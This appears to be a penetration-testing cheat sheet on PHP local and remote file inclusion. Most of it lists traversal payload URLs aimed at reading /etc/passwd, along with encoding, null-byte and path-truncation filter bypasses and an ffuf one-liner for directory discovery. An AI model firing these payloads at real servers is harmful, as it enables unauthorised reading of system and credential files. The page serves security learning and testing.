# LFI/RFI Basics

## Theory

**Remote File Inclusion (RFI):** The file is loaded from a remote server (Best: You can write the code and the server will execute it). In php this is **disabled** by default (**allow\_url\_include**).\
**Local File Inclusion (LFI):** The sever loads a local file.

## Practice

#### Basic LFI

Here is a very simple example of an LFI:

```
http://example.com/index.php?page=../../../etc/passwd
```

{% tabs %}
{% tab title="stripped non-recursively" %}
You might be able to use nested traversal sequences, such as `....//` or `....\/`, which will revert to simple traversal sequences when the inner sequence is stripped.

```url
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
{% endtab %}

{% tab title="URL encoding" %}
In some contexts, such as in a URL path or the `filename` parameter of a `multipart/form-data` request, web servers may strip any directory traversal sequences before passing your input to the application. \
You can sometimes bypass this kind of sanitization by **URL encoding**, or **even double URL encoding**, the `../` characters, resulting in `%2e%2e%2f` or `%252e%252e%252f` respectively. Various non-standard encodings, such as `..%c0%af` or `..%ef%bc%8f`, may also do the trick.

```url
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
{% endtab %}

{% tab title="Path validation" %}
Maybe the back-end is checking the folder path:

```url
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
{% endtab %}

{% tab title="Folder identification" %}
Depending on the applicative code / allowed characters, it might be possible to recursively explore the file system by discovering folders and not just files.&#x20;

1. identify the "depth" of you current directory by succesfully retrieving `/etc/passwd` (if on Linux):

```
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```

2. try and guess the name of a folder in the current directory by adding the folder name (here, `private`), and then going back to `/etc/passwd`:

```
http://example.com/index.php?page=private/../../../../etc/passwd # we went deeper down one level, so we have to go 3+1=4 levels up to go back to /etc/passwd 
```

3. if the application is vulnerable, there might be two different outcomes to the request: an error / no output, the `private` folder does not exist at this location; if you get the content from `/etc/passwd`, you validated that there is indeed a `private`folder in your current directory

We can **weaponize** this process using `ffuf` and `sed`:

```bash
# Adapt to your needs
$ sed 's_^_../../../var/www/_g' /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt | sed 's_$_/../../../etc/passwd_g' > payloads.txt
$ ffuf -u http://example.com/index.php?page=FUZZ -w payloads.txt -mr "root"
```
{% endtab %}
{% endtabs %}

#### LFI filter evasion

{% tabs %}
{% tab title="Null Byte" %}
Bypass the append more chars at the end of the provided string (bypass of: $\_GET\['param']."php")

```
http://example.com/index.php?page=../../../etc/passwd%00
```
{% endtab %}

{% tab title="Path truncation" %}
Bypass the append of more chars at the end of the provided string (bypass of: $\_GET\['param']."php")

{% hint style="info" %}
**In PHP**: `/etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.`
{% endhint %}

```uri
#Always try to start the path with a fake directory (a/).url
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.

#With the next options, by trial and error, you have to discover how many "../" are needed to delete the appended string but not "/etc/passwd" (near 2027)
#This vulnerability was corrected in PHP 5.3.
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
{% endtab %}

{% tab title="Filter bypass tricks" %}
Here are some payload that may evade filters

```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
```
{% endtab %}
{% endtabs %}

## References

{% embed url="https://portswigger.net/web-security/file-path-traversal" %}

{% embed url="https://book.hacktricks.xyz/pentesting-web/file-inclusion" %}
